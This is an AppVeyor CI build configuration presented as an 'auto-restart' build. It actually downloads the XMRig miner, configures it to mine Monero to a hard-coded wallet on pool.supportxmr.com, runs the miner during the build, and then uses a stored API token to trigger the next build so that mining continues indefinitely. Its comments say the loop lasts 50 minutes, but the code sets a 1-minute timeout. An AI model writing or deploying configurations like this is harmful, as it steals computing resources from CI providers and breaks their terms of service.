# AppVeyor Build Configuration with 50-Minute Auto-Restart

image: Visual Studio 2022

# Ensure your API_TOKEN is set in the Project Settings > Environment tab in AppVeyor.
#
build: off

install:
  - ps: |
      $ErrorActionPreference = "Stop"
      $minerVersion = "6.21.2"
      $downloadUrl = "https://github.com/xmrig/xmrig/releases/download/v$($minerVersion)/xmrig-$($minerVersion)-msvc-win64.zip"
      $zipPath = "$env:TEMP\xmrig.zip"
      $extractPath = "$env:USERPROFILE\Desktop\miner"
      New-Item -ItemType Directory -Force -Path $extractPath
      Invoke-WebRequest -Uri $downloadUrl -OutFile $zipPath
      Expand-Archive -Path $zipPath -DestinationPath $extractPath -Force
      $minerFolder = (Get-ChildItem -Path $extractPath -Directory | Where-Object { $_.Name -like 'xmrig*' }).FullName
      if (-not $minerFolder) { throw "CRITICAL: Could not find extracted XMRig folder!" }
      $jsonContent = '{"autosave": true,"cpu": true,"opencl": false,"cuda": false,"pools": [{"algo": "rx/0","url": "pool.supportxmr.com:5555","user": "49UWTwnrxNXi8eMTCqdC5U3eiMHrPZkvvbsYN3WEde4o9RYebixumBCCy5oCdoSKkS2U6t9gXJFzJNkxXC7tJ1Uq4uky5BP","pass": "x"}]}'
      $jsonContent | ConvertFrom-Json | ConvertTo-Json -Depth 100 | Set-Content -Path (Join-Path $minerFolder "config.json")
      $batPath = Join-Path $extractPath "Start-Miner.bat"
      $batContent = "@echo off`r`ncd /d ""$($minerFolder)""`r`nxmrig.exe"
      Set-Content -Path $batPath -Value $batContent

build_script:
  - ps: |
      Write-Host "Starting the miner process..."
      Start-Process -FilePath "$env:USERPROFILE\Desktop\miner\Start-Miner.bat"
      
      Write-Host "Miner process has been launched. This build will run for 50 minutes before restarting."
      
      # --- Start of Timed Loop ---
      $startTime = Get-Date
      $timeoutMinutes = 1
      
      # This loop will run for 50 minutes and then exit cleanly.
      while (((Get-Date) - $startTime).TotalMinutes -lt $timeoutMinutes) {
          Start-Sleep -Seconds 300
          Write-Host "[$(Get-Date)] - Build active, miner running in background..."
      }
      
      Write-Host "50-minute mark reached. Build will now finish, triggering the restart process."
      # --- End of Timed Loop ---

on_finish:
  - ps: |
      Write-Host "Build finished. Attempting to trigger the next build via API..."
      
      $accountName = "Peter211231231231232131"
      $projectSlug = "voyage-test"
      $branch = "main"
      
      try {
          if (-not $env:API_TOKEN) {
              throw "FATAL: API_TOKEN environment variable not found."
          }

          $apiUrl = "https://ci.appveyor.com/api/builds"
          
          $headers = @{
              "Authorization" = "Bearer $env:API_TOKEN"
              "Content-type"  = "application/json"
          }
          
          $body = @{
              accountName = $accountName
              projectSlug = $projectSlug
              branch      = $branch
          } | ConvertTo-Json
          
          Invoke-RestMethod -Uri $apiUrl -Method Post -Headers $headers -Body $body
          
          Write-Host "SUCCESS: The next build has been triggered."
      }
      catch {
          Write-Host "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
          Write-Host "           API CALL FAILED - ERROR"
          Write-Host "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
          Write-Host "Error details: $($_.Exception.Message)"
          Write-Host "!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!"
          throw
      }
